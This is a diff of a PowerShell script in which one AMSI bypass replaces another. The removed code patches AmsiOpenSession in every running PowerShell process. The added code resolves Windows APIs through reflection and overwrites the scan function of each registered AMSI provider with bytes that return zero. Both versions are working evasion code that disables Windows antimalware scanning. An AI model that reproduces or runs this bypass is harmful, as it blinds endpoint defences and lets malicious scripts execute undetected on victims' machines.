@@ -1,113 +1,97 @@
-$confirmation = Read-Host "Are you ready to nuke AMSI from this shell? Press Enter to continue"
+## Variables
+$InteropServicesMarshalClass = [System.Runtime.InteropServices.Marshal]
+$exec_write = 0x00000080
+$old_permissions = 0;
+$i = 0;
+$intPtrSize = $InteropServicesMarshalClass::SizeOf([Type][IntPtr]) 
+$scanFunc_patch = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3) 
 
-Add-Type -TypeDefinition @"
-using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
 
-public class NukeAMSI
-{
-    public const int PROCESS_VM_OPERATION = 0x0008;
-    public const int PROCESS_VM_READ = 0x0010;
-    public const int PROCESS_VM_WRITE = 0x0020;
-    public const uint PAGE_EXECUTE_READWRITE = 0x40;
-
-    [DllImport("ntdll.dll")]
-    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);
-
-    [DllImport("ntdll.dll")]
-    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
-
-    [DllImport("ntdll.dll")]
-    public static extern int NtClose(IntPtr Handle);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr LoadLibrary(string lpFileName);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct OBJECT_ATTRIBUTES
-    {
-        public int Length;
-        public IntPtr RootDirectory;
-        public IntPtr ObjectName;
-        public int Attributes;
-        public IntPtr SecurityDescriptor;
-        public IntPtr SecurityQualityOfService;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct CLIENT_ID
-    {
-        public IntPtr UniqueProcess;
-        public IntPtr UniqueThread;
-    }
+## This function resolves APIs
+function resolveApi {
+ Param (
+  [string] $library,
+  [string] $function
+ )
+  
+    $call_GetModuleHandle = $hGetModuleHandle.Invoke($Null, @($library))
+    $intPtr = New-Object IntPtr
+    $handleRefPtr = New-Object System.Runtime.InteropServices.HandleRef($intPtr, $call_GetModuleHandle)
+    $hGetProcAddress.Invoke($Null, @([System.Runtime.InteropServices.HandleRef]$handleRefPtr, $function))
 }
-"@
 
-function ModAMSI {
-    param (
-        [int]$processId
+
+## The function creates a delegate that is used for calling unmanaged functions via their function pointers.
+function CreateApiDelegate {
+    Param ( 
+        [Parameter(Position = 0, Mandatory = $true)] [IntPtr] $functionPointer,
+        [Parameter(Position = 1, Mandatory = $true)] [Type[]] $argumentTypes,
+        [Parameter(Position = 2)] [Type] $returnType = [Void]
     )
+    $dynamicAssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('QM', $false).DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $dynamicAssemblyBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $argumentTypes).SetImplementationFlags('Runtime, Managed')
+    $dynamicAssemblyBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $returnType, $argumentTypes).SetImplementationFlags('Runtime, Managed')
+    $dynamicTypeBuilder = $dynamicAssemblyBuilder.CreateType()
+    $InteropServicesMarshalClass::GetDelegateForFunctionPointer($functionPointer, $dynamicTypeBuilder)
+}
+
+
+# Loads system.windows.forms into script so it's classes can be used.
+Add-Type -AssemblyName System.Windows.Forms
+
+# Uses reflection to retrieve the UnsafeNativeMethods class from the System.Windows.Forms assembly.
+$UnsafeNativeMethods = [System.Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
+
+$hGetModuleHandle = $UnsafeNativeMethods.GetMethod("GetModuleHandle")
+$hGetProcAddress = $UnsafeNativeMethods.GetMethod("GetProcAddress")
+
+$pAmsiInitialize = resolveApi "amsi.dll" "AmsiInitialize"
+$pVirtualProtect = resolveApi "kernel32.dll" "VirtualProtect"
+
+
+if ($intPtrSize  -eq 8)  { ## 64 bit
+ $hVirtualProtect = CreateApiDelegate $pVirtualProtect @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+ $hAmsiInitialize = CreateApiDelegate $pAmsiInitialize @([string], [UInt64].MakeByRefType()) ([Int])
+ [Int64]$hAmsiInitialize_sysArch = 0 | out-null
+} else { ## 32 bit
+ $hVirtualProtect = CreateApiDelegate $pVirtualProtect @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+ $hAmsiInitialize = CreateApiDelegate $pAmsiInitialize @([string], [IntPtr].MakeByRefType()) ([Int])
+ $hAmsiInitialize_sysArch = 0 | out-null
+}
+
+
+$hAmsiInitialize.Invoke("Scanner", [ref]$hAmsiInitialize_sysArch) | out-null
+
+
+if ($intPtrSize  -eq 8)  { ## 64 bit
+ $C_Amsi_AM = $InteropServicesMarshalClass::ReadInt64([IntPtr]$hAmsiInitialize_sysArch, 16)
+ $Amsi_Provider = $InteropServicesMarshalClass::ReadInt64([IntPtr]$C_Amsi_AM, 64)
+} else { ## 32 bit
+ $C_Amsi_AM = $InteropServicesMarshalClass::ReadInt32([IntPtr]$hAmsiInitialize_sysArch, 8)
+ $Amsi_Provider = $InteropServicesMarshalClass::ReadInt32([IntPtr]$C_Amsi_AM, 36)
+}
+
+
+## AMSI patch loop
+while ($Amsi_Provider  -ne 0)  {
+    ## Search for the AMSI scan function
+    $provider_vtable = $InteropServicesMarshalClass::ReadInt64([IntPtr]$Amsi_Provider)
+    $provider_scan_func = $InteropServicesMarshalClass::ReadInt64([IntPtr]$provider_vtable, 24)
+
+    ## Change to write permissions
+    $hVirtualProtect.Invoke($provider_scan_func, [uint32]6, $exec_write, [ref]$old_permissions) | out-null
+
+    ## Copy the patch bytes
+    $InteropServicesMarshalClass::Copy($scanFunc_patch, 0, [IntPtr]$provider_scan_func, 6)
+
+    ## Change back to old permissions
+    $hVirtualProtect.Invoke($provider_scan_func, [uint32]6, $old_permissions, [ref]$old_permissions) | out-null
+
+    $i++
     
-    $patch = [byte]0xEB
-
-    $objectAttributes = New-Object NukeAMSI+OBJECT_ATTRIBUTES
-    $clientId = New-Object NukeAMSI+CLIENT_ID
-    $clientId.UniqueProcess = [IntPtr]$processId
-    $clientId.UniqueThread = [IntPtr]::Zero
-    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)
-
-    $hHandle = [IntPtr]::Zero
-    $status = [NukeAMSI]::NtOpenProcess([ref]$hHandle, [NukeAMSI]::PROCESS_VM_OPERATION -bor [NukeAMSI]::PROCESS_VM_READ -bor [NukeAMSI]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)
-
-    if ($status -ne 0) { return }
-
-    $amsiHandle = [NukeAMSI]::LoadLibrary("amsi.dll")
-    if ($amsiHandle -eq [IntPtr]::Zero) {
-        [NukeAMSI]::NtClose($hHandle)
-        return
-    }
-
-    $amsiOpenSession = [NukeAMSI]::GetProcAddress($amsiHandle, "AmsiOpenSession")
-    if ($amsiOpenSession -eq [IntPtr]::Zero) {
-        [NukeAMSI]::NtClose($hHandle)
-        return
-    }
-
-    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)
-
-    $oldProtect = [UInt32]0
-    $size = [UIntPtr]::new(1)
-    $protectStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, [NukeAMSI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
-
-    if (-not $protectStatus) {
-        [NukeAMSI]::NtClose($hHandle)
-        return
-    }
-
-    $bytesWritten = [System.UInt32]0
-    $status = [NukeAMSI]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)
-
-    if ($status -ne 0) {
-        [NukeAMSI]::NtClose($hHandle)
-        return
-    }
-
-    $restoreStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)
-
-    [NukeAMSI]::NtClose($hHandle)
-}
-
-function ModAllPShells {
-    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
-        ModAMSI -processId $_.Id
+    if ($intPtrSize  -eq 8)  { ## 64 bit
+        $Amsi_Provider = $InteropServicesMarshalClass::ReadInt64([IntPtr]$C_Amsi_AM, 64  +  ($i * $intPtrSize))
+    } else { ## 32 bit
+        $Amsi_Provider = $InteropServicesMarshalClass::ReadInt32($C_Amsi_AM + 36  +  ($i * $intPtrSize))
     }
 }
-
-ModAllPShells
